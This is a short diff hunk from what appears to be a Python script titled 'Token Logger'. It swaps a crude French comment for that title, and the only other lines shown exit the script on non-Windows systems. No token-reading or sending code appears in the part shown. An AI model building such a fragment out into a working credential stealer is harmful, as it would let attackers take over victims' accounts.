@@ -1,4 +1,4 @@
-#Mika va surement passer par là, arrête juste de nous faire chier. 
+#Token Logger
 import os 
 if os.name != "nt": 
     exit() 
